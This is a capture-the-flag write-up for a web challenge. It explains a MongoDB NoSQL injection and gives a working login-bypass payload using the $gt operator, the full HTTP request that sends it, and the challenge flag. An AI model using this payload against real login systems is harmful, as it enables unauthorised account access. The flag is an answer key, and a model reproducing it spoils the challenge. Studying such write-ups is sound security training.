# No Sequels
Web (50 points, 317 solves)

## Challenge 

The prequels sucked, and the sequels aren't much better, but at least we always have the [original trilogy](https://nosequels.2019.chall.actf.co/).

Author: Sirlan

## Hint

MongoDB is a safer alternative to SQL, right?

## Solution

This looks like a standard SQL injection problem, except this site uses MongoDB instead. But, it looks like the query parameters `username` and `password` are fed directly into `db.collection('users').findOne()`. This means we can send JSON for those parameters and they'll be sent to the database. So, what can we do with JSON?

MongoDB has several comparators (like SQL's ">"). For example, the [greater-than comparator](https://docs.mongodb.com/manual/reference/operator/query/gt/) has this syntax:

```json
{field: {$gt: value}}
```

So how can we leverage this? Well, we can ask for a username that is greater than an empty string, which is always true. So, our payload will look like this:

```json
{
   "username": {"$gt": ""},
   "password": {"$gt": ""}
}
```

Sending this off with [Insomnia](https://insomnia.rest/) gives us the flag. 

```
> POST /login HTTP/1.1
> Host: nosequels.2019.chall.actf.co
> User-Agent: insomnia/6.4.0
> Cookie: token=eyJhbG...
> Content-Type: application/json
> Accept: */*
> Content-Length: 54

| {
| 	"username": {"$gt": ""},
| 	"password": {"$gt": ""}
| }
```

## Flag

```
actf{no_sql_doesn't_mean_no_vuln}
```
